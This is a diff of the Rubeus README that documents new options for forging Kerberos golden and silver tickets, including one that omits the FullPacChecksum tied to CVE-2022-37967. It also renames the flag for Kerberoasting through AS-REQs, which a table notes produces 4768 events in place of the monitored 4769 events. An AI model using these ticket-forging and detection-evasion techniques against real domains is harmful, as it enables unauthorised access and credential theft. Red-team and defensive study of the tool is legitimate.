@@ -81,7 +81,7 @@ Rubeus is licensed under the BSD 3-Clause license.
       | |  \ \| |_| | |_) ) ____| |_| |___ |
       |_|   |_|____/|____/|_____)____/(___/
 
-      v2.2.0
+      v2.2.1
 
 
      Ticket requests and renewals:
@@ -139,19 +139,19 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a golden ticket using LDAP to gather the relevent information but explicitly overriding some values:
-            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/extendedupndns] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a golden ticket, setting values explicitly:
-            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/extendedupndns] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a silver ticket using LDAP to gather the relevent information:
-            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a silver ticket using LDAP to gather the relevent information, using the KRBTGT key to calculate the KDCChecksum and TicketChecksum:
-            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap </krbkey:HASH> [/krbenctype:DES|RC4|AES128|AES256] [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap </krbkey:HASH> [/krbenctype:DES|RC4|AES128|AES256] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a silver ticket using LDAP to gather the relevent information but explicitly overriding some values:
-            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a silver ticket using LDAP to gather the relevent information and including an S4U Delegation Info PAC section:
             Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]
@@ -160,7 +160,7 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/printcmd] [outfile:FILENAME] [/ptt]
 
         Forge a silver ticket, setting values explicitly:
-            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]
+            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]
 
 		Forge a diamond TGT by requesting a TGT based on a user password/hash:
 			Rubeus.exe diamond /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/createnetonly:C:\Windows\System32\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]
@@ -250,7 +250,7 @@ Rubeus is licensed under the BSD 3-Clause license.
             Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
 
         Perform Kerberoasting using an account without pre-auth by sending AS-REQ's:
-            Rubeus.exe kerberoast </spn:""blah/blah"" | /spns:C:\temp\spns.txt> /preauth:USER /domain:DOMAIN [/dc:DOMAIN_CONTROLLER] [/nowrap]
+            Rubeus.exe kerberoast </spn:""blah/blah"" | /spns:C:\temp\spns.txt> /nopreauth:USER /domain:DOMAIN [/dc:DOMAIN_CONTROLLER] [/nowrap]
 
         Perform AS-REP "roasting" for any users without preauth:
             Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
@@ -1321,6 +1321,7 @@ Other arguments common to both commands but to set fields outside of the PAC are
 | /rangeend | This is for creating multiple tickets that start at different times. This will be the last starttime, relative to `/starttime`, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below |
 | /rangeinterval | This is for creating multiple tickets that starts are different times. This is the interval that will be used between each starttime, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below |
 | /flags | Sets the ticket flags within the EncTicketPart (Default: forwardable,renewable,pre_authent and for `golden` also initial) |
+| /extendedupndns | Includes the new extended UpnDns (which includes the samaccountname and account SID) |
 
 For the relative times described in the tables above, the format is an integer used as a multiplier followed by a single character which acts as a timerange. The meaning of each supported character is shown in the table below (**These are case sensitive**):
 
@@ -1347,6 +1348,8 @@ The `/printcmd` flag can be used to print the arguments required to generate ano
 The **golden** action will forge a TGT for the user `/user:X` encrypting the ticket with the hash passed with `/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X` and using the same key to create the ServerChecksum and KDCChecksum. The various arguments to set fields manually are described above or the `/ldap` flag can be used to automatically retrieve the information from the domain controller.
 
 The `/oldpac` switch can be used to exclude the new *Requestor* and *Attributes* PAC_INFO_BUFFERs, added in response to CVE-2021-42287.
+
+The `/extendedupndns` switch will include the new extended UpnDns elements. This involved adding _2_ to the Flags, as well as containing the samaccountname and account SID.
 
 Forging a TGT using the `/ldap` flag to retrieve the information and the `/printcmd` flag to print a command to forge another ticket with the same PAC information:
 
@@ -1595,6 +1598,8 @@ The **silver** action will forge a ticket for the user `/user:X` and service `/s
 The `/cname:X` and `/crealm:X` arguments can be used to set different values for those fields within the EncTicketPart (encrypted part of the ticket), this is sometimes seen within referral delegation tickets. A S4UDelegationInfo PAC section can be added by passing the `/s4uproxytarget:X` and `/s4utransitedservices:SPN1,SPN2,...` arguments, this section provides a final target for delegation and the list of SPNs the delegation has happened through.
 
 The `/authdata` flag can be used to add some generic Authorization Data sections to the EncTicketPart, by default this will include a *KERB-LOCAL* section and a *KERB-AD-RESTRICTION-ENTRY* section with some default values.
+
+The `/nofullpacsig` flag will **exclude** the new *FullPacChecksum*, [introduced](https://support.microsoft.com/en-gb/topic/kb5020805-how-to-manage-kerberos-protocol-changes-related-to-cve-2022-37967-997e9acc-67c5-48e1-8d0d-190269bf4efb) to resolve the [CVE-2022-37967](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-37967) vulnerability. This signature is included by default in any tickets not secured with the krbtgt key.
 
 Forging a service ticket to **cifs/SQL1.rubeus.ghostpack.local** for the user **ccob** using the services *RC4* password hash and signing the KDCChecksum and TicketChecksum with the proper KRBTGT *AES256* key, using LDAP with alternate credentials to get the PAC information:
 
@@ -3032,7 +3037,7 @@ If the `/autoenterprise` flag is used, if roasting an SPN fails (due to an inval
 
 If the `/ldaps` flag is used, any LDAP queries will go over TLS (port 636).
 
-If the `/preauth:USER` argument is used, either the `/spn:Y` or `/spns:Y` argument is required. The `/preauth:USER` argument will attempt to send AS-REQ's with the service being those passed in `/spn:Y` or `/spns:Y` to request service tickets.
+If the `/nopreauth:USER` argument is used, either the `/spn:Y` or `/spns:Y` argument is required. The `/nopreauth:USER` argument will attempt to send AS-REQ's with the service being those passed in `/spn:Y` or `/spns:Y` to request service tickets.
 
 
 #### kerberoasting opsec
@@ -3050,7 +3055,7 @@ Here is a table comparing the behavior of various flags from an opsec perspectiv
 | **/pwdsetafter:X** | Use the supplied date and only enumerate accounts with password last changed after that date |
 | **/pwdsetbefore:X** | Use the supplied date and only enumerate accounts with password last changed before that date |
 | **/resultlimit:X** | Use the specified number to limit the accounts that will be roasted |
-| **/preauth:USER** | Will send AS-REQ's rather than TGS-REQ's which results in 4768 events instead of the 4769 frequently monitored for kerberoasting detections |
+| **/nopreauth:USER** | Will send AS-REQ's rather than TGS-REQ's which results in 4768 events instead of the 4769 frequently monitored for kerberoasting detections |
 
 #### Examples
 
